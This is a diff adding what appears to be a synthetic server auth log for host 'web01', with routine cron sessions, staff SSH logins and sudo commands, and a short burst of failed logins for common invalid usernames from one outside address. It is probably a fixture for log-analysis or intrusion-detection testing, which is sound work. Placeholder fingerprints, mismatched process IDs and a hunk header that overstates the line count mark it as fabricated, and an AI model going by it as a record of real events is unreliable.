@@ -1,0 +1,1763 @@
+Oct 12 00:00:39 web01 CRON[61655]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 00:00:40 web01 CRON[35948]: pam_unix(cron:session): session closed for user root
+Oct 12 00:10:45 web01 CRON[24976]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 00:10:46 web01 CRON[38419]: pam_unix(cron:session): session closed for user root
+Oct 12 00:20:37 web01 CRON[48965]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 00:20:38 web01 CRON[11858]: pam_unix(cron:session): session closed for user root
+Oct 12 00:30:49 web01 CRON[55026]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 00:30:50 web01 CRON[22809]: pam_unix(cron:session): session closed for user root
+Oct 12 00:40:24 web01 CRON[42607]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 00:40:25 web01 CRON[52748]: pam_unix(cron:session): session closed for user root
+Oct 12 00:50:23 web01 CRON[61406]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 00:50:24 web01 CRON[21161]: pam_unix(cron:session): session closed for user root
+Oct 12 01:00:25 web01 CRON[46686]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 01:00:26 web01 CRON[14431]: pam_unix(cron:session): session closed for user root
+Oct 12 01:10:48 web01 CRON[44009]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 01:10:49 web01 CRON[57611]: pam_unix(cron:session): session closed for user root
+Oct 12 01:20:58 web01 CRON[24912]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 01:20:59 web01 CRON[8162]: pam_unix(cron:session): session closed for user root
+Oct 12 01:30:27 web01 CRON[54768]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 01:30:28 web01 CRON[42628]: pam_unix(cron:session): session closed for user root
+Oct 12 01:40:25 web01 CRON[59990]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 01:40:26 web01 CRON[5282]: pam_unix(cron:session): session closed for user root
+Oct 12 01:50:32 web01 CRON[46823]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 01:50:33 web01 CRON[44786]: pam_unix(cron:session): session closed for user root
+Oct 12 02:00:22 web01 CRON[59217]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 02:00:23 web01 CRON[27449]: pam_unix(cron:session): session closed for user root
+Oct 12 02:10:25 web01 CRON[53534]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 02:10:26 web01 CRON[49335]: pam_unix(cron:session): session closed for user root
+Oct 12 02:20:51 web01 CRON[21371]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 02:20:52 web01 CRON[44499]: pam_unix(cron:session): session closed for user root
+Oct 12 02:30:01 web01 CRON[55559]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 02:30:02 web01 CRON[24145]: pam_unix(cron:session): session closed for user root
+Oct 12 02:40:38 web01 CRON[8768]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 02:40:39 web01 CRON[31207]: pam_unix(cron:session): session closed for user root
+Oct 12 02:50:15 web01 CRON[63754]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 02:50:16 web01 CRON[12220]: pam_unix(cron:session): session closed for user root
+Oct 12 03:00:50 web01 CRON[56826]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 03:00:51 web01 CRON[21560]: pam_unix(cron:session): session closed for user root
+Oct 12 03:10:43 web01 CRON[46255]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 03:10:44 web01 CRON[61409]: pam_unix(cron:session): session closed for user root
+Oct 12 03:20:58 web01 CRON[40622]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 03:20:59 web01 CRON[30960]: pam_unix(cron:session): session closed for user root
+Oct 12 03:30:38 web01 CRON[18357]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 03:30:39 web01 CRON[53690]: pam_unix(cron:session): session closed for user root
+Oct 12 03:40:12 web01 CRON[36897]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 03:40:13 web01 CRON[5410]: pam_unix(cron:session): session closed for user root
+Oct 12 03:50:40 web01 CRON[35435]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 03:50:41 web01 CRON[64536]: pam_unix(cron:session): session closed for user root
+Oct 12 04:00:39 web01 CRON[64555]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 04:00:40 web01 CRON[38833]: pam_unix(cron:session): session closed for user root
+Oct 12 04:10:49 web01 CRON[3875]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 04:10:50 web01 CRON[5734]: pam_unix(cron:session): session closed for user root
+Oct 12 04:20:26 web01 CRON[64078]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 04:20:27 web01 CRON[43789]: pam_unix(cron:session): session closed for user root
+Oct 12 04:30:57 web01 CRON[41615]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 04:30:58 web01 CRON[4527]: pam_unix(cron:session): session closed for user root
+Oct 12 04:40:43 web01 CRON[2123]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 04:40:44 web01 CRON[42615]: pam_unix(cron:session): session closed for user root
+Oct 12 04:50:12 web01 CRON[13912]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 04:50:13 web01 CRON[7854]: pam_unix(cron:session): session closed for user root
+Oct 12 05:00:18 web01 CRON[13882]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 05:00:19 web01 CRON[30643]: pam_unix(cron:session): session closed for user root
+Oct 12 05:10:47 web01 CRON[61065]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 05:10:48 web01 CRON[53313]: pam_unix(cron:session): session closed for user root
+Oct 12 05:20:36 web01 CRON[21596]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 05:20:37 web01 CRON[1816]: pam_unix(cron:session): session closed for user root
+Oct 12 05:30:50 web01 CRON[62398]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 05:30:51 web01 CRON[41028]: pam_unix(cron:session): session closed for user root
+Oct 12 05:40:21 web01 CRON[29322]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 05:40:22 web01 CRON[38493]: pam_unix(cron:session): session closed for user root
+Oct 12 05:50:50 web01 CRON[15994]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 05:50:51 web01 CRON[37019]: pam_unix(cron:session): session closed for user root
+Oct 12 06:00:02 web01 CRON[51855]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 06:00:03 web01 CRON[37399]: pam_unix(cron:session): session closed for user root
+Oct 12 06:10:46 web01 CRON[43320]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 06:10:47 web01 CRON[21139]: pam_unix(cron:session): session closed for user root
+Oct 12 06:20:54 web01 CRON[59419]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 06:20:55 web01 CRON[15001]: pam_unix(cron:session): session closed for user root
+Oct 12 06:30:39 web01 CRON[64862]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 06:30:40 web01 CRON[12848]: pam_unix(cron:session): session closed for user root
+Oct 12 06:40:33 web01 CRON[35518]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 06:40:34 web01 CRON[35632]: pam_unix(cron:session): session closed for user root
+Oct 12 06:50:11 web01 CRON[51811]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 06:50:12 web01 CRON[44426]: pam_unix(cron:session): session closed for user root
+Oct 12 07:00:03 web01 CRON[49913]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 07:00:04 web01 CRON[33418]: pam_unix(cron:session): session closed for user root
+Oct 12 07:10:45 web01 CRON[49267]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 07:10:46 web01 CRON[39257]: pam_unix(cron:session): session closed for user root
+Oct 12 07:20:29 web01 CRON[64792]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 07:20:30 web01 CRON[59903]: pam_unix(cron:session): session closed for user root
+Oct 12 07:30:01 web01 CRON[53755]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 07:30:02 web01 CRON[35229]: pam_unix(cron:session): session closed for user root
+Oct 12 07:40:31 web01 CRON[36541]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 07:40:32 web01 CRON[50294]: pam_unix(cron:session): session closed for user root
+Oct 12 07:50:41 web01 CRON[48767]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 07:50:42 web01 CRON[62144]: pam_unix(cron:session): session closed for user root
+Oct 12 08:00:22 web01 CRON[49149]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 08:00:23 web01 CRON[37593]: pam_unix(cron:session): session closed for user root
+Oct 12 08:10:51 web01 CRON[38288]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 08:10:52 web01 CRON[43248]: pam_unix(cron:session): session closed for user root
+Oct 12 08:20:16 web01 CRON[18155]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 08:20:17 web01 CRON[5377]: pam_unix(cron:session): session closed for user root
+Oct 12 08:30:45 web01 CRON[9551]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 08:30:46 web01 CRON[63117]: pam_unix(cron:session): session closed for user root
+Oct 12 08:40:03 web01 CRON[60220]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 08:40:04 web01 CRON[12148]: pam_unix(cron:session): session closed for user root
+Oct 12 08:50:20 web01 CRON[54738]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 08:50:21 web01 CRON[6139]: pam_unix(cron:session): session closed for user root
+Oct 12 09:00:12 web01 CRON[29800]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 09:00:13 web01 CRON[63433]: pam_unix(cron:session): session closed for user root
+Oct 12 09:10:34 web01 CRON[55625]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 09:10:35 web01 CRON[17583]: pam_unix(cron:session): session closed for user root
+Oct 12 09:20:56 web01 CRON[4515]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 09:20:57 web01 CRON[37342]: pam_unix(cron:session): session closed for user root
+Oct 12 09:30:09 web01 CRON[28987]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 09:30:10 web01 CRON[23886]: pam_unix(cron:session): session closed for user root
+Oct 12 09:40:38 web01 CRON[47987]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 09:40:39 web01 CRON[58746]: pam_unix(cron:session): session closed for user root
+Oct 12 09:50:58 web01 CRON[62015]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 09:50:59 web01 CRON[3808]: pam_unix(cron:session): session closed for user root
+Oct 12 10:00:27 web01 CRON[19841]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 10:00:28 web01 CRON[49567]: pam_unix(cron:session): session closed for user root
+Oct 12 10:10:09 web01 CRON[4667]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 10:10:10 web01 CRON[42544]: pam_unix(cron:session): session closed for user root
+Oct 12 10:20:29 web01 CRON[23760]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 10:20:30 web01 CRON[25932]: pam_unix(cron:session): session closed for user root
+Oct 12 10:30:04 web01 CRON[14658]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 10:30:05 web01 CRON[24096]: pam_unix(cron:session): session closed for user root
+Oct 12 10:40:42 web01 CRON[45358]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 10:40:43 web01 CRON[43188]: pam_unix(cron:session): session closed for user root
+Oct 12 10:50:38 web01 CRON[18279]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 10:50:39 web01 CRON[48014]: pam_unix(cron:session): session closed for user root
+Oct 12 11:00:13 web01 CRON[13551]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 11:00:14 web01 CRON[9921]: pam_unix(cron:session): session closed for user root
+Oct 12 11:10:30 web01 CRON[26681]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 11:10:31 web01 CRON[41184]: pam_unix(cron:session): session closed for user root
+Oct 12 11:20:27 web01 CRON[37229]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 11:20:28 web01 CRON[17572]: pam_unix(cron:session): session closed for user root
+Oct 12 11:24:53 web01 sshd[5591]: Accepted publickey for bob from 10.0.0.25 port 43870 ssh2: ED25519 SHA256:x
+Oct 12 11:24:54 web01 systemd-logind[41524]: New session 6118 of user bob.
+Oct 12 11:26:53 web01 sudo: bob : TTY=pts/4 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/docker ps
+Oct 12 11:30:10 web01 CRON[15512]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 11:30:11 web01 CRON[47622]: pam_unix(cron:session): session closed for user root
+Oct 12 11:40:53 web01 CRON[22872]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 11:40:54 web01 CRON[26752]: pam_unix(cron:session): session closed for user root
+Oct 12 11:50:39 web01 CRON[13748]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 11:50:40 web01 CRON[53558]: pam_unix(cron:session): session closed for user root
+Oct 12 11:54:53 web01 sshd[6621]: Received disconnect from 10.0.0.25 port 59049:11: disconnected by user
+Oct 12 11:55:25 web01 sshd[45140]: Failed password for carol from 10.0.0.26 port 51939 ssh2
+Oct 12 11:55:30 web01 sshd[30365]: Accepted publickey for carol from 10.0.0.26 port 52910 ssh2: ED25519 SHA256:x
+Oct 12 11:55:31 web01 systemd-logind[34496]: New session 9200 of user carol.
+Oct 12 12:00:48 web01 CRON[63762]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 12:00:49 web01 CRON[41953]: pam_unix(cron:session): session closed for user root
+Oct 12 12:10:59 web01 CRON[28363]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 12:11:00 web01 CRON[62234]: pam_unix(cron:session): session closed for user root
+Oct 12 12:12:05 web01 sshd[44037]: Accepted publickey for alice from 10.0.0.19 port 39296 ssh2: ED25519 SHA256:x
+Oct 12 12:12:06 web01 systemd-logind[48888]: New session 1032 of user alice.
+Oct 12 12:18:20 web01 sshd[10483]: Accepted publickey for carol from 10.0.0.21 port 33826 ssh2: ED25519 SHA256:x
+Oct 12 12:18:21 web01 systemd-logind[8058]: New session 2395 of user carol.
+Oct 12 12:20:10 web01 CRON[48048]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 12:20:11 web01 CRON[31750]: pam_unix(cron:session): session closed for user root
+Oct 12 12:20:20 web01 sudo: carol : TTY=pts/4 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/docker ps
+Oct 12 12:22:50 web01 sshd[4512]: Failed password for alice from 10.0.0.34 port 58711 ssh2
+Oct 12 12:22:55 web01 sshd[22129]: Accepted publickey for alice from 10.0.0.34 port 54533 ssh2: ED25519 SHA256:x
+Oct 12 12:22:56 web01 systemd-logind[50550]: New session 212 of user alice.
+Oct 12 12:24:13 web01 sshd[6775]: Failed password for bob from 10.0.0.29 port 38963 ssh2
+Oct 12 12:24:18 web01 sshd[27030]: Accepted publickey for bob from 10.0.0.29 port 46586 ssh2: ED25519 SHA256:x
+Oct 12 12:24:19 web01 systemd-logind[12385]: New session 7753 of user bob.
+Oct 12 12:25:30 web01 sshd[51581]: Received disconnect from 10.0.0.26 port 60850:11: disconnected by user
+Oct 12 12:26:18 web01 sudo: bob : TTY=pts/5 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 12 12:30:39 web01 CRON[46721]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 12:30:40 web01 CRON[42233]: pam_unix(cron:session): session closed for user root
+Oct 12 12:37:24 web01 sshd[28153]: Failed password for bob from 10.0.0.26 port 60667 ssh2
+Oct 12 12:37:29 web01 sshd[61069]: Accepted publickey for bob from 10.0.0.26 port 51189 ssh2: ED25519 SHA256:x
+Oct 12 12:37:30 web01 systemd-logind[11218]: New session 4704 of user bob.
+Oct 12 12:37:31 web01 sshd[1007]: Accepted publickey for alice from 10.0.0.35 port 45842 ssh2: ED25519 SHA256:x
+Oct 12 12:37:32 web01 systemd-logind[45455]: New session 670 of user alice.
+Oct 12 12:40:20 web01 CRON[3580]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 12:40:21 web01 CRON[2981]: pam_unix(cron:session): session closed for user root
+Oct 12 12:42:05 web01 sshd[61497]: Received disconnect from 10.0.0.19 port 51519:11: disconnected by user
+Oct 12 12:48:20 web01 sshd[54928]: Received disconnect from 10.0.0.21 port 54481:11: disconnected by user
+Oct 12 12:50:34 web01 CRON[40318]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 12:50:35 web01 CRON[13590]: pam_unix(cron:session): session closed for user root
+Oct 12 12:52:55 web01 sshd[50927]: Received disconnect from 10.0.0.34 port 59643:11: disconnected by user
+Oct 12 12:54:18 web01 sshd[42922]: Received disconnect from 10.0.0.29 port 50812:11: disconnected by user
+Oct 12 13:00:41 web01 CRON[29670]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 13:00:42 web01 CRON[21115]: pam_unix(cron:session): session closed for user root
+Oct 12 13:07:29 web01 sshd[32864]: Received disconnect from 10.0.0.26 port 42578:11: disconnected by user
+Oct 12 13:07:31 web01 sshd[6399]: Received disconnect from 10.0.0.35 port 47725:11: disconnected by user
+Oct 12 13:10:48 web01 CRON[62798]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 13:10:49 web01 CRON[63867]: pam_unix(cron:session): session closed for user root
+Oct 12 13:20:34 web01 CRON[21652]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 13:20:35 web01 CRON[52170]: pam_unix(cron:session): session closed for user root
+Oct 12 13:30:25 web01 CRON[58278]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 13:30:26 web01 CRON[24507]: pam_unix(cron:session): session closed for user root
+Oct 12 13:40:14 web01 CRON[61113]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 13:40:15 web01 CRON[21006]: pam_unix(cron:session): session closed for user root
+Oct 12 13:45:35 web01 sshd[7835]: Accepted publickey for carol from 10.0.0.34 port 42777 ssh2: ED25519 SHA256:x
+Oct 12 13:45:36 web01 systemd-logind[19449]: New session 5266 of user carol.
+Oct 12 13:45:37 web01 sshd[58997]: Accepted publickey for alice from 10.0.0.23 port 40044 ssh2: ED25519 SHA256:x
+Oct 12 13:45:38 web01 systemd-logind[56041]: New session 9879 of user alice.
+Oct 12 13:47:35 web01 sudo: carol : TTY=pts/5 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/docker ps
+Oct 12 13:47:37 web01 sudo: alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Oct 12 13:50:57 web01 CRON[29840]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 13:50:58 web01 CRON[39019]: pam_unix(cron:session): session closed for user root
+Oct 12 14:00:24 web01 CRON[64287]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 14:00:25 web01 CRON[42716]: pam_unix(cron:session): session closed for user root
+Oct 12 14:02:12 web01 sshd[51566]: Failed password for invalid user admin from 198.51.100.23 port 36663 ssh2
+Oct 12 14:02:18 web01 sshd[18395]: Failed password for invalid user test from 198.51.100.23 port 51055 ssh2
+Oct 12 14:02:28 web01 sshd[16539]: Failed password for invalid user oracle from 198.51.100.23 port 53052 ssh2
+Oct 12 14:02:34 web01 sshd[6973]: Failed password for invalid user postgres from 198.51.100.23 port 43521 ssh2
+Oct 12 14:02:47 web01 sshd[9648]: Failed password for invalid user ubuntu from 198.51.100.23 port 48636 ssh2
+Oct 12 14:02:53 web01 sshd[19500]: Failed password for invalid user guest from 198.51.100.23 port 33104 ssh2
+Oct 12 14:03:00 web01 sshd[14799]: Failed password for invalid user user from 198.51.100.23 port 60576 ssh2
+Oct 12 14:03:10 web01 sshd[9325]: Failed password for invalid user ftp from 198.51.100.23 port 42302 ssh2
+Oct 12 14:03:23 web01 sshd[15347]: Failed password for invalid user git from 198.51.100.23 port 47371 ssh2
+Oct 12 14:03:37 web01 sshd[61906]: Failed password for invalid user jenkins from 198.51.100.23 port 47081 ssh2
+Oct 12 14:03:46 web01 sshd[32261]: Failed password for invalid user pi from 198.51.100.23 port 33974 ssh2
+Oct 12 14:03:55 web01 sshd[29495]: Failed password for invalid user support from 198.51.100.23 port 49905 ssh2
+Oct 12 14:10:24 web01 CRON[10441]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 14:10:25 web01 CRON[41872]: pam_unix(cron:session): session closed for user root
+Oct 12 14:15:35 web01 sshd[2619]: Received disconnect from 10.0.0.34 port 43442:11: disconnected by user
+Oct 12 14:15:37 web01 sshd[63902]: Received disconnect from 10.0.0.23 port 46698:11: disconnected by user
+Oct 12 14:20:52 web01 CRON[19063]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 14:20:53 web01 CRON[50977]: pam_unix(cron:session): session closed for user root
+Oct 12 14:30:47 web01 CRON[16513]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 14:30:48 web01 CRON[26259]: pam_unix(cron:session): session closed for user root
+Oct 12 14:40:52 web01 CRON[47422]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 14:40:53 web01 CRON[6625]: pam_unix(cron:session): session closed for user root
+Oct 12 14:50:29 web01 CRON[46484]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 14:50:30 web01 CRON[1188]: pam_unix(cron:session): session closed for user root
+Oct 12 15:00:21 web01 CRON[6622]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 15:00:22 web01 CRON[56132]: pam_unix(cron:session): session closed for user root
+Oct 12 15:08:07 web01 sshd[4644]: Failed password for bob from 10.0.0.25 port 32842 ssh2
+Oct 12 15:08:12 web01 sshd[10913]: Accepted publickey for bob from 10.0.0.25 port 41178 ssh2: ED25519 SHA256:x
+Oct 12 15:08:13 web01 systemd-logind[51046]: New session 1779 of user bob.
+Oct 12 15:10:12 web01 sudo: bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 12 15:10:59 web01 CRON[19036]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 15:11:00 web01 CRON[33225]: pam_unix(cron:session): session closed for user root
+Oct 12 15:20:33 web01 CRON[54708]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 15:20:34 web01 CRON[39941]: pam_unix(cron:session): session closed for user root
+Oct 12 15:30:58 web01 CRON[26477]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 15:30:59 web01 CRON[10144]: pam_unix(cron:session): session closed for user root
+Oct 12 15:38:12 web01 sshd[52602]: Received disconnect from 10.0.0.25 port 40542:11: disconnected by user
+Oct 12 15:40:02 web01 CRON[57284]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 15:40:03 web01 CRON[62816]: pam_unix(cron:session): session closed for user root
+Oct 12 15:50:32 web01 CRON[39086]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 15:50:33 web01 CRON[25824]: pam_unix(cron:session): session closed for user root
+Oct 12 16:00:12 web01 CRON[42909]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 16:00:13 web01 CRON[30118]: pam_unix(cron:session): session closed for user root
+Oct 12 16:04:21 web01 sshd[27357]: Failed password for bob from 10.0.0.28 port 34796 ssh2
+Oct 12 16:04:26 web01 sshd[22664]: Accepted publickey for bob from 10.0.0.28 port 52146 ssh2: ED25519 SHA256:x
+Oct 12 16:04:27 web01 systemd-logind[7782]: New session 3541 of user bob.
+Oct 12 16:10:07 web01 CRON[44712]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 16:10:08 web01 CRON[16926]: pam_unix(cron:session): session closed for user root
+Oct 12 16:20:19 web01 CRON[4424]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 16:20:20 web01 CRON[33220]: pam_unix(cron:session): session closed for user root
+Oct 12 16:30:50 web01 CRON[47988]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 16:30:51 web01 CRON[14924]: pam_unix(cron:session): session closed for user root
+Oct 12 16:34:26 web01 sshd[35643]: Received disconnect from 10.0.0.28 port 55357:11: disconnected by user
+Oct 12 16:40:22 web01 CRON[36059]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 16:40:23 web01 CRON[22521]: pam_unix(cron:session): session closed for user root
+Oct 12 16:50:59 web01 CRON[19138]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 16:51:00 web01 CRON[39008]: pam_unix(cron:session): session closed for user root
+Oct 12 17:00:06 web01 CRON[45611]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 17:00:07 web01 CRON[57127]: pam_unix(cron:session): session closed for user root
+Oct 12 17:10:43 web01 CRON[63276]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 17:10:44 web01 CRON[10996]: pam_unix(cron:session): session closed for user root
+Oct 12 17:20:32 web01 CRON[51484]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 17:20:33 web01 CRON[39729]: pam_unix(cron:session): session closed for user root
+Oct 12 17:30:42 web01 CRON[43220]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 17:30:43 web01 CRON[3832]: pam_unix(cron:session): session closed for user root
+Oct 12 17:40:41 web01 CRON[37728]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 17:40:42 web01 CRON[33523]: pam_unix(cron:session): session closed for user root
+Oct 12 17:50:18 web01 CRON[2038]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 17:50:19 web01 CRON[10744]: pam_unix(cron:session): session closed for user root
+Oct 12 18:00:09 web01 CRON[31533]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 18:00:10 web01 CRON[6264]: pam_unix(cron:session): session closed for user root
+Oct 12 18:10:58 web01 CRON[58228]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 18:10:59 web01 CRON[43552]: pam_unix(cron:session): session closed for user root
+Oct 12 18:20:46 web01 CRON[41322]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 18:20:47 web01 CRON[33041]: pam_unix(cron:session): session closed for user root
+Oct 12 18:30:59 web01 CRON[30986]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 18:31:00 web01 CRON[49181]: pam_unix(cron:session): session closed for user root
+Oct 12 18:40:46 web01 CRON[2366]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 18:40:47 web01 CRON[12486]: pam_unix(cron:session): session closed for user root
+Oct 12 18:50:50 web01 CRON[13635]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 18:50:51 web01 CRON[11638]: pam_unix(cron:session): session closed for user root
+Oct 12 19:00:15 web01 CRON[50271]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 19:00:16 web01 CRON[15602]: pam_unix(cron:session): session closed for user root
+Oct 12 19:10:41 web01 CRON[3772]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 19:10:42 web01 CRON[47587]: pam_unix(cron:session): session closed for user root
+Oct 12 19:20:40 web01 CRON[53377]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 19:20:41 web01 CRON[29878]: pam_unix(cron:session): session closed for user root
+Oct 12 19:30:29 web01 CRON[47700]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 19:30:30 web01 CRON[53768]: pam_unix(cron:session): session closed for user root
+Oct 12 19:40:25 web01 CRON[45120]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 19:40:26 web01 CRON[21113]: pam_unix(cron:session): session closed for user root
+Oct 12 19:50:48 web01 CRON[21501]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 12 19:50:49 web01 CRON[2642]: pam_unix(cron:session): session closed for user root
